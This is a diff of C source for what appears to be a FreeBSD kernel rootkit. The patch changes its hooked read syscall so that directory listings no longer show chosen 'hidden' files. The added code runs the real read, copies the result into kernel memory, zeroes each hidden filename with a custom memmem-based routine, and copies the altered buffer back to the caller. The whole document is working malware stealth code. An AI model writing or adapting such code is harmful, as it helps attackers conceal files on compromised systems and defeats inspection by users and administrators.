@@ -346,20 +346,81 @@ get_hidden_file_filename(unsigned int index)
 	return filename;
 }
 
+void *
+memmem(const void *l, size_t l_len, const void *s, size_t s_len)
+{
+        char *cur, *last;
+        const char *cl = (const char *)l;
+        const char *cs = (const char *)s;
+
+        /* we need something to compare */
+        if (l_len == 0 || s_len == 0)
+                return NULL;
+
+        /* "s" must be smaller or equal to "l" */
+        if (l_len < s_len)
+                return NULL;
+
+        /* special case where s_len == 1 */
+        if (s_len == 1)
+                return memchr(l, (int)*cs, l_len);
+
+        /* the last position where its possible to find "s" in "l" */
+        last = __DECONST(char *, cl) + l_len - s_len;
+
+        for (cur = __DECONST(char *, cl); cur <= last; cur++)
+                if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
+                        return cur;
+
+        return NULL;
+}
+
+static void
+corrupt_directory_data(char *data, size_t data_len, const char *filename,
+		size_t filename_len)
+{
+	char *mem;
+
+	mem = (char *) memmem(data, data_len, filename, filename_len);
+	if (mem == NULL)
+	{
+		return;
+	}
+
+	/* Iterate over memory and corrupt it. */
+	for (; filename_len > 0; filename_len--, mem++)
+	{
+		*mem = '\0';
+	}
+}
+
 static int
 read_hook(struct thread *td, void *syscall_args)
 {
 	int i;
 	int ret;
+	int ret_sys;
+	int size;
+
+	char *buf;
 
 	struct file *fp;
 	struct vnode *vp;
 	cap_rights_t rights;
 
 	struct read_args *uap;
-	uap = (struct read_args *) syscall_args;
 
+	ret_sys = sys_read(td, syscall_args);
+	if (ret_sys)
+	{
+		return(ret_sys);
+	}
+
+	size = td->td_retval[0];
+
+	uap = (struct read_args *) syscall_args;
 	fp = NULL;
+	buf = NULL;
 
 	ret = getvnode(td, uap->fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
 	if (ret == 0)
@@ -374,6 +435,17 @@ read_hook(struct thread *td, void *syscall_args)
 							td, uap->fd, i))
 				{
 					LOGI("[rootkit:read_hook] Directory read on hidden file detected.\n");
+					/* Copying buffer into kernel memory. */
+					if (buf == NULL)
+					{
+						buf = malloc(size, M_TEMP, M_WAITOK);
+						copyin(uap->buf, buf, size);
+					}
+
+					/* Overwrite buffer. */
+					corrupt_directory_data(buf, size,
+							get_hidden_file_filename(i),
+							strlen(get_hidden_file_filename(i)));
 				}
 			}
 		}
@@ -381,7 +453,13 @@ read_hook(struct thread *td, void *syscall_args)
 		fdrop(fp, td);
 	}
 
-	return sys_read(td, syscall_args);
+	if (buf != NULL)
+	{
+		copyout(buf, uap->buf, size);
+		free(buf, M_TEMP);
+	}
+
+	return(ret_sys);
 }
 
 void
